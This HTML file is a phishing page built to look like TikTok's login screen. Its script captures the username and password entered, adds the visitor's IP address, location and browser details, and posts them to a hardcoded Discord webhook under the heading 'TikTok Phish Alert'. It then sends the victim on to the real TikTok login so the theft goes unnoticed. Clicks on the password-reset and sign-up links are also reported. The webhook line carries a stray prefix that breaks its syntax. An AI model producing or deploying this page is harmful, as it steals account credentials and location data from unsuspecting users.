<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok - Make Your Day</title>
<style>
  body { font-family: 'Proxima Nova', Arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .login-container { width: 360px; padding: 40px 20px; text-align: center; }
  .title { font-size: 24px; font-weight: 700; margin-bottom: 30px; }
  .input-group { margin-bottom: 15px; }
  input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; background: #f8f8f8; box-sizing: border-box; }
  .btn { width: 100%; padding: 14px; background-color: #fe2c55; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
  .btn:hover { background-color: #e62a4d; }
  .links { margin-top: 20px; font-size: 12px; color: #161823; display: flex; justify-content: space-between; }
  .links a { color: #161823; text-decoration: none; font-weight: 600; }
  .links a:hover { text-decoration: underline; }
</style>
</head>
<body>
<div class="login-container">
  <div class="title">Log in to TikTok</div>
  <form id="loginForm">
    <div class="input-group">
      <input type="text" id="email" placeholder="Email or username" required>
    </div>
    <div class="input-group">
      <input type="password" id="password" placeholder="Password" required>
    </div>
    <button type="submit" class="btn">Log in</button>
  </form>
  <div class="links">
    <a href="#" id="forgot">Forgot password?</a>
    <a href="#" id="register">Sign up</a>
  </div>
</div>
<script>
  const WEBHOOK_URL = R_'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
  async function gatherDataAndSend(actionType, email = '', password = '') {
    let ipData = {};
    try {
      const res = await fetch('https://ipapi.co/json/');
      ipData = await res.json();
    } catch(e) { console.error('IP fetch failed'); }
    const payload = {
      content: `🚨 **TikTok Phish Alert: ${actionType}** 🚨`,
      embeds: [{
        title: "Target Data Captured",
        color: 16711680,
        fields: [
          { name: "Email/User", value: email || "N/A", inline: true },
          { name: "Password", value: password || "N/A", inline: true },
          { name: "IP Address", value: ipData.ip || "Unknown", inline: false },
          { name: "Location", value: `${ipData.city || 'Unknown'}, ${ipData.region || ''}, ${ipData.country_name || ''}`, inline: false },
          { name: "OS & Browser", value: navigator.userAgent, inline: false },
          { name: "Timestamp", value: new Date().toISOString(), inline: false }
        ]
      }]
    };
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  }
  document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;
    await gatherDataAndSend('Login Attempt', email, pass);
    window.location.href = 'https://www.tiktok.com/login';
  });
  document.getElementById('forgot').addEventListener('click', async (e) => {
    e.preventDefault();
    await gatherDataAndSend('Clicked Forgot Password');
  });
  document.getElementById('register').addEventListener('click', async (e) => {
    e.preventDefault();
    await gatherDataAndSend('Clicked Register');
  });
</script>
</body>
</html>
